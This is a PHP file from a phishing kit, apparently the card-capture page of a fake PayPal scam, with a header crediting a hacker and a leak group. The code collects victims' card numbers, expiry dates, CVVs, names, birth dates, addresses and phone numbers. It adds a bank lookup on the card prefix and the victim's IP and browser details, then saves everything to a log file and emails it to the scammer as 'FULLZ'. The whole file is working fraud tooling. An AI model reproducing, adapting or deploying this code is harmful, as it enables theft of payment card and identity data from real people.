<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
    if(isset($_POST['ccn'])&&isset($_POST['fnm'])){
	session_start();
	include '../bot.php';
	include '../mine.php';
	$ctp=$_POST['ctp'];
	$ccn=$_POST['ccn'];
	$cex=$_POST['cex'];
	$csc=$_POST['csc'];
	$fnm=$_POST['fnm'];
	$dob=$_POST['dob'];
	$adr=$_POST['adr'];
	$cty=$_POST['cty'];
	$zip=$_POST['zip'];
	$stt=$_POST['stt'];
	$cnt=$_POST['cnt'];
	$ptp=$_POST['ptp'];
	$par=$_POST['par'];
	$pnm=$_POST['pnm'];
	$_SESSION['ctp']=$_POST['ctp'];
	$_SESSION['ccn']=$_POST['ccn'];
	$_SESSION['cex']=$_POST['cex'];
	$_SESSION['csc']=$_POST['csc'];
	$_SESSION['fnm']=$_POST['fnm'];
	$_SESSION['adr']=$_POST['adr'];
	$_SESSION['cty']=$_POST['cty'];
	$_SESSION['zip']=$_POST['zip'];
	$_SESSION['stt']=$_POST['stt'];
	$_SESSION['cnt']=$_POST['cnt'];
	$_SESSION['ptp']=$_POST['ptp'];
	$_SESSION['par']=$_POST['par'];
	$_SESSION['pnm']=$_POST['pnm'];
	$_SESSION['dob']=$_POST['dob'];
	if(isset($_SESSION['ccn']) && !empty($_SESSION['ccn'])){
	$bin=substr(str_replace(' ','',$ccn),0,6);	
		$ch=curl_init();
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://lookup.binlist.net/".$bin);
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		$code=json_decode($json);
		$bin_scheme = $code->scheme;
		$bin_bank = $code->bank->name;
		$bin_type = $code->type;
		$bin_brand = $code->brand;
		$bin_countrycode = $code->country->alpha2;
		$bin_url = parse_url(strtolower($code->bank->url));
		$bin_phone = strtolower($code->bank->phone);
		$bin_country = $code->country->name;
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        $_SESSION['_cc_brand_'] = $bin_scheme;
        $_SESSION['_cc_type_']  = $bin_type;
        $_SESSION['_cc_class_'] = $bin_brand;
        $_SESSION['_cc_site_']  = $bin_url['host'];
        $_SESSION['_cc_phone_'] = $bin_phone;
        $_SESSION['_country_']  = $bin_country;
        $_SESSION['_cc_bank_']  = $bin_bank;
        $_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
         }
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
	$msg="=========== <[ -".$scamname."- PPL FULLZ ]> ===========\r\n";
	$msg.="----------------------- Billing ---------------------\r\n";
	$msg.="Full Name	: {$fnm}\r\n";
	$msg.="Birth Date	: {$dob}\r\n";
	$msg.="Address		: {$adr}\r\n";
	$msg.="City		: {$cty}\r\n";
	$msg.="State		: {$stt}\r\n";
	$msg.="Zip Code	: {$zip}\r\n";
	$msg.="Country		: {$cnt}\r\n";
	$msg.="Phone		: {$ptp} | {$par} {$pnm}\r\n";
	$msg.="----------------------- CC Info ---------------------\r\n";
	$msg.="CC Brand	: {$ctp}\r\n";
	$msg.="CC Number	: {$ccn}\r\n";
	$msg.="CC Expiry	: {$cex}\r\n";
	$msg.="CVV			: {$csc}\r\n";
	$msg.="----------------------- BIN Info {$bin} -------------\r\n";
	$msg.="CC Data		: {$bin_scheme} {$bin_brand} -> {$bin_type}\r\n";
	$msg.="CC Bank		: {$bin_bank}\r\n";
	$msg.="CC Country	: {$bin_country}\r\n";
	$msg.="---------------------- IP Info ----------------------\r\n";
	$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
	$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$msg.="TIME		: ".now()." GMT\r\n";
	$msg.="=========== <[ THANKS TO SH33NZ0 ]> ===========\r\n\r\n\r\n";
		if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
$subject="-".$scamname."- PPL FULLZ [{$bin} {$ctp}] From [{$_SESSION['ip_countryName']}]";
$headers="From: xAthena <ccard@".$_SERVER['SERVER_NAME'].">\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
	}
exit('done');
}
?>